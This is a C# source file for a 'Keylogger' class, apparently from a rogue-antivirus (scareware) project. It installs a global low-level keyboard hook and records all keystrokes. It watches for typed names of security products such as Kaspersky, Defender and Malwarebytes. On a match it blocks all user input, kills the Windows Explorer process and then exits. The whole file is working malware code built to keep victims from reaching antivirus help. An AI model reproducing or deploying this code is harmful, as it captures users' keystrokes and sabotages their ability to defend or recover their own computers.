using System;
using System.Collections.Generic;
using System.Diagnostics.Eventing.Reader;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Documents;
using System.Windows.Forms;
using app = System.Windows;
using RogueAntivirusPatched.View.Pages;
using RogueAntivirusPatched.View.Windows;
using System.Diagnostics;

namespace RogueAntivirusPatched.Classes
{
    internal class Keylogger
    {
        // imports from windows.h
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private const byte VK_HOME = 0x24;
        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
        [DllImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hook); // to remove hook
        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(IntPtr hook, int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);
        [DllImport("user32.dll")]
        private static extern bool BlockInput(bool fBlockIt);

        [DllImport("user32.dll", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
        private static extern void keybd_event(uint bVk, uint bScan, uint dwFlags, uint dwExtraInfo);

        private static List<string> blacklistedWords = new List<string>()
        { 
            "antivirus",
            "kaspersky",
            "malwarebytes",
            "avast",
            "virus",
            "malware",
            "trojan",
            "rogue",
            "avira",
            "protegent",
            "avg",
            "defender",
            "norton",
            "mcafee",
            "sophos",
            "eset",
            "surfshark",
            "nordvpn",
            "comodo"
        };
        private static int maxSize = blacklistedWords.OrderByDescending(word => word.Length).First().Length; // gets biggest word length
        private static StringBuilder input = new StringBuilder();

        [StructLayout(LayoutKind.Sequential)]
        private struct KBDLLHOOKSTRUCT
        {
            public int vkCode;      // Virtual-key code (e.g., VK_RETURN, VK_MENU, etc.)
            public int scanCode;    // Hardware scan code of the key
            public int flags;       // Event-injection flags (e.g., extended key, injected, etc.)
            public int time;        // Timestamp for this message
            public IntPtr dwExtraInfo; // Extra info associated with the message
        }

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int virtualKey = Marshal.ReadInt32(lParam);
                Keys key = (Keys)virtualKey;
                if (key == Keys.Back) 
                {
                    if (input.Length != 0)
                        input.Remove(input.Length - 1, 1);
                }

                string character = key.ToString();
                if (character.Length != 1) goto __continue__; // more than 1 is not default character

                input.Append(character);
                Console.WriteLine("Current Input: " + input);

                foreach (string word in blacklistedWords)
                {
                    if (input.ToString().ToLower().Contains(word.ToLower()))
                    {
                        ForbiddenApproach();

                        input.Clear();
                        break;
                    }
                }

                // limit buffer length
                if (input.Length > maxSize)
                    input.Remove(0, input.Length);

            }
        __continue__:
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        private async static void ForbiddenApproach()
        {
            BlockInput(true);

            var keyStrokeTrigger = new KeystrokeTrigger();
            await keyStrokeTrigger.DoAnimation();

            var explorer = Process.GetProcessesByName("explorer");

            foreach (var process in explorer)
            {
                if (explorer.Length != 0)
                    process.Kill();
            }

            var timerBSOD = new Timer();
            timerBSOD.Enabled = false;
            timerBSOD.Interval = 10000;
            timerBSOD.Tick += (s, e) =>
            {
                Environment.Exit(0);
            };
            timerBSOD.Start();
        }

        public static void Hook()
        {
            _hookID = SetWindowsHookEx(WH_KEYBOARD_LL, _proc, GetModuleHandle(null), 0);
        }

        // not really needed but may be useful
        public static void Remove()
        {
            if (_hookID == IntPtr.Zero) return;
            UnhookWindowsHookEx(_hookID);
            _hookID = IntPtr.Zero;
        }

        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;
    }
}
